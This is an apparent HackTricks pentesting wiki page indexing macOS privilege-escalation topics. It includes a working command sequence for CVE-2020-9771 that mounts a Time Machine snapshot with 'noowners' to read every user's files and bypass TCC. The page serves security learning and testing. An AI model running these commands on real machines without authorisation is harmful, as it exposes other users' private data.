# macOS Security & Privilege Escalation

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof is home to all crypto bug bounties.**

**Get rewarded without delays**\
HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.

**Get experience in web3 pentesting**\
Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.

**Become the web3 hacker legend**\
Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.

[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!

{% embed url="https://hackenproof.com/register" %}

## Basic MacOS

If you are not familiar with macOS, you should start learning the basics of macOS:

* Special macOS **files & permissions:**

{% content-ref url="macos-files-folders-and-binaries/" %}
[macos-files-folders-and-binaries](macos-files-folders-and-binaries/)
{% endcontent-ref %}

* Common macOS **users**

{% content-ref url="macos-users.md" %}
[macos-users.md](macos-users.md)
{% endcontent-ref %}

* **AppleFS**

{% content-ref url="macos-applefs.md" %}
[macos-applefs.md](macos-applefs.md)
{% endcontent-ref %}

* The **architecture** of the k**ernel**

{% content-ref url="mac-os-architecture/" %}
[mac-os-architecture](mac-os-architecture/)
{% endcontent-ref %}

* Common macOS n**etwork services & protocols**

{% content-ref url="macos-protocols.md" %}
[macos-protocols.md](macos-protocols.md)
{% endcontent-ref %}

* **Opensource** macOS: [https://opensource.apple.com/](https://opensource.apple.com/)

### MacOS MDM

In companies **macOS** systems are highly probably going to be **managed with a MDM**. Therefore, from the perspective of an attacker is interesting to know **how that works**:

{% content-ref url="../macos-red-teaming/macos-mdm/" %}
[macos-mdm](../macos-red-teaming/macos-mdm/)
{% endcontent-ref %}

### MacOS - Inspecting, Debugging and Fuzzing

{% content-ref url="macos-apps-inspecting-debugging-and-fuzzing/" %}
[macos-apps-inspecting-debugging-and-fuzzing](macos-apps-inspecting-debugging-and-fuzzing/)
{% endcontent-ref %}

## MacOS Security Protections

{% content-ref url="macos-security-protections/" %}
[macos-security-protections](macos-security-protections/)
{% endcontent-ref %}

## Attack Surface

### File Permissions

If a **process running as root writes** a file that can be controlled by a user, the user could abuse this to **escalate privileges**.\
This could occur in the following situations:

* File used was already created by a user (owned by the user)
* File used is writable by the user because of a group
* File used is inside a directory owned by the user (the user could create the file)
* File used is inside a directory owned by root but user has write access over it because of a group (the user could create the file)

Being able to **create a file** that is going to be **used by root**, allows a user to **take advantage of its content** or even create **symlinks/hardlinks** to point it to another place.

For this kind of vulnerabilities don't forget to **check vulnerable `.pkg` installers**:

{% content-ref url="macos-files-folders-and-binaries/macos-installers-abuse.md" %}
[macos-installers-abuse.md](macos-files-folders-and-binaries/macos-installers-abuse.md)
{% endcontent-ref %}

### Entitlements and Privileges abuse via process abuse

If a process can **inject code in another process with better privileges or entitlements** or contact it to perform privileges actions, he could escalate privileges and bypass defensive meassures such as [Sandbox](macos-security-protections/macos-sandbox/) or [TCC](macos-security-protections/macos-tcc/).

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

### File Extension & URL scheme app handlers

Weird apps registered by file extensions could be abused and different applications can be register to open specific protocols

{% content-ref url="macos-file-extension-apps.md" %}
[macos-file-extension-apps.md](macos-file-extension-apps.md)
{% endcontent-ref %}

## MacOS Privilege Escalation

### CVE-2020-9771 - mount\_apfs TCC bypass and privilege escalation

**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### Sensitive Information

{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
{% endcontent-ref %}

### Linux Privesc

First of all, please note that **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines. So see:

{% content-ref url="../../linux-hardening/privilege-escalation/" %}
[privilege-escalation](../../linux-hardening/privilege-escalation/)
{% endcontent-ref %}

## MacOS Defensive Apps

## References

* [**OS X Incident Response: Scripting and Analysis**](https://www.amazon.com/OS-Incident-Response-Scripting-Analysis-ebook/dp/B01FHOHHVS)
* [**https://taomm.org/vol1/analysis.html**](https://taomm.org/vol1/analysis.html)
* [**https://github.com/NicolasGrimonpont/Cheatsheet**](https://github.com/NicolasGrimonpont/Cheatsheet)
* [**https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ**](https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ)
* [**https://www.youtube.com/watch?v=vMGiplQtjTY**](https://www.youtube.com/watch?v=vMGiplQtjTY)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof is home to all crypto bug bounties.**

**Get rewarded without delays**\
HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.

**Get experience in web3 pentesting**\
Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.

**Become the web3 hacker legend**\
Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.

[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
